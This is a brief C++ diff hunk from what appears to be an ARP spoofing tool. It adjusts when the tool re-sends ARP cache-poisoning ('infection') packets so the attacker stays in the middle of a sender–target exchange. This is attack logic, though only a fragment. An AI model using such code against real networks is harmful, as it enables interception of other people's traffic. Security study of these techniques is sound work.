@@ -300,8 +300,8 @@ bool arp_relay(pcap_t* pcap, Mac attack_mac, Mac sender_mac, Mac target_mac, Ip 
                     }
                 cout << "case 1 infected\n";
             }
-            //sender -> target unicast
-            else if (ethhdr->smac() == sender_mac && ethhdr->dmac() == target_mac && arp_pkt->op() == ArpHdr::Request ) {
+            //sender -> target(attack spoofed) unicast
+            else if (ethhdr->smac() == sender_mac && ethhdr->dmac() == attack_mac && arp_pkt->op() == ArpHdr::Request ) {
                 if (!arp_infection(pcap, attack_mac, sender_mac, sender_ip, target_ip)) {
                     cout << "Failed ARP infection\n";
                     return false;
